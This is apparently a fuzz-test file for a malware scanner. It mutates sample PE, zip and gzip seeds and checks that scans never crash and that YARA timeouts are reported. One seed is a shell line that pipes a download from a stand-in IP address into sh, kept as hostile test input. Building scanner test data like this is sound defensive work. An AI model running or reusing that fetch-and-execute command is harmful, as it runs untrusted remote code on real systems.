"""The scanner is pointed at hostile input, so it must never crash on it."""
import gzip
import random

import pytest

from zscan import yara_engine
from zscan.cli import main
from zscan.scanner import Scanner
from zscan.yara_engine import YaraEngine

from samples import EICAR, benign_pe, make_zip, packed_like_pe

SEEDS = {
    "pe": benign_pe(),
    "pe-packed": packed_like_pe(),
    "zip": make_zip({"a.txt": b"hello", "b.exe": benign_pe(), "c/eicar.com": EICAR}),
    "gzip": gzip.compress(make_zip({"eicar.com": EICAR})),
    "script": b"#!/bin/sh\ncurl http://203.0.113.9/x | sh\n" * 20,
}


def mutate(data: bytes, rng: random.Random) -> bytes:
    b = bytearray(data)
    kind = rng.randrange(4)
    if kind == 0:    # flip a few random bytes
        for _ in range(rng.randint(1, 8)):
            b[rng.randrange(len(b))] = rng.randrange(256)
    elif kind == 1:  # truncate
        del b[rng.randrange(1, len(b)):]
    elif kind == 2:  # huge sizes and offsets
        n = rng.randint(1, 8)
        i = rng.randrange(len(b))
        b[i:i + n] = b"\xff" * n
    else:            # wipe part of the header
        i = rng.randrange(min(len(b), 512))
        b[i:i + 16] = bytes(16)
    return bytes(b)


@pytest.mark.parametrize("kind", sorted(SEEDS))
def test_mutated_files_never_crash(kind, tmp_path):
    scanner = Scanner(YaraEngine(community=False))
    rng = random.Random(1234)
    for i in range(150):
        p = tmp_path / f"{kind}-{i}.bin"
        p.write_bytes(mutate(SEEDS[kind], rng))
        rep = scanner.scan_file(p)
        assert rep.verdict in ("clean", "suspicious", "malicious"), (kind, i, rep.error)


def test_yara_timeout_is_a_note_not_a_crash(monkeypatch, tmp_path, capsys):
    monkeypatch.setattr(yara_engine, "_run",
                        lambda rules, data, timeout, label: ([], f"{label} YARA rules timed out after {timeout}s"))
    p = tmp_path / "a.txt"
    p.write_text("hello")
    code = main([str(p), "--no-color", "--no-community"])
    out = capsys.readouterr().out
    assert code == 0
    assert "not fully scanned" in out and "timed out" in out
    assert "1 not fully scanned" in out


def test_json_reports_partial_scans(monkeypatch, tmp_path, capsys):
    import json
    monkeypatch.setattr(yara_engine, "_run", lambda rules, data, timeout, label: ([], "boom"))
    p = tmp_path / "a.txt"
    p.write_text("hello")
    main([str(p), "--json", "--no-community"])
    out = json.loads(capsys.readouterr().out)
    assert out["summary"]["partly_scanned"] == 1
    assert out["files"][0]["unscanned"] == ["boom"]


def test_too_many_yara_matches_is_quiet(tmp_path, recwarn):
    rule = tmp_path / "r.yar"
    rule.write_text('rule zeros { meta: severity = 3 strings: $a = { 00 } condition: $a }')
    big = tmp_path / "zeros.bin"
    big.write_bytes(bytes(2 * 1024 * 1024 + 1))
    rep = Scanner(YaraEngine([rule], community=False)).scan_file(big)
    assert any(f.title == "YARA: zeros" for f in rep.findings)
    assert not [w for w in recwarn if "too many matches" in str(w.message)]
